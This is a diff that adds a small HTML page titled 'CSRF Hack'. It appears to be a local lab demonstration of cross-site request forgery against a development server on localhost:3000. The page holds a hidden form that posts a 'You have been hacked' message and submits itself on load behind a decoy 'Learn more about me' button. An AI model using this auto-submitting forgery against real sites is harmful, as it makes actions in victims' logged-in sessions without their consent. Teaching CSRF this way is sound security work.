@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body style="font-family: Verdana, Geneva, Tahoma, sans-serif">
+    <h1>CSRF Hack</h1>
+    <p style="line-height: 1.6rem">
+      Start sev server in localhost:3000 and then open php server <span style="background-color: lightblue; font-style: italic; padding: 5px"><small>php -S 0.0.0.0:8000</small></span> in this folder:
+    </p>
+    <form action="http://localhost:3000/create-post" method="POST">
+      <input type="hidden" name="title" value="You have been hacked" />
+      <input type="hidden" name="body" value="HAHAHAHAHAHAHAHA 😈" />
+      <button>Learn more about me</button>
+    </form>
+    <script>
+      document.querySelector('form').submit()
+    </script>
+  </body>
+</html>
